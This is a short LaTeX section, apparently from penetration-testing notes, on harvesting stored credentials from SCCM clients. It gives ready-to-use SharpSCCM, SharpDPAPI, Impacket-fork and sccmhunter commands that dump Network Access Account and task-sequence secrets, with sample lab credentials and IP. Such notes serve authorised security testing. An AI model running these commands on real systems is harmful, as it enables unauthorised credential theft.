\section{Credentials Harvesting}

Searching for privileged users is the first step in performing credentials harvesting. Credentials can be found in client databases, logs, or the CIM cache. This is particularly true for SCCM servers on the Management Point, where credentials can be stored or transmitted. Generally, stored credentials are encrypted by DPAPI, so high local privileges are required to decrypt them.

There are three common places where we can search for credentials:
\begin{itemize}
    \item Device Collection Variables:
    \item Task Sequence Variables
    \item Network Access Accounts (NAAs)
\end{itemize}


With SYSTEM access on the client, the credentials can be retrieved:

prerequisites:
\begin{itemize}
    \item local admin on a SCCM client
\end{itemize}

\subsection{sharpSCCM}
\begin{verbatim}
sharpsccm.exe get secrets
# NAA, Task Sequences, Collection Variables
sharpsccm.exe local secrets -m wmi
\end{verbatim}
        
\subsection{sharpDPAPI}
\begin{verbatim}
.\sharpDPAPI.exe SCCM
\end{verbatim}

\subsection{Impacket SystemDPAPIdump.py}
 fork \url{https://github.com/clavoillotte/impacket}

\begin{verbatim}
python3 SystemDPAPIdump.py -creds -sccm la_jubeaz:'jubeaz'@architect -target-ip 172.16.0.20
-userkey USERKEY      \
    dpapi_userkey for SYSTEM (e.g. if previously dumped using secretsdump). \
    If not provided an LSA secrets dump will be performed to retrieve it.
\end{verbatim}

\subsection{sccmhunter}
\begin{verbatim}
python3 sccmhunter.py dpapi -debug -u la_jubez -p jubeaz -target 172.16.0.20
\end{verbatim}
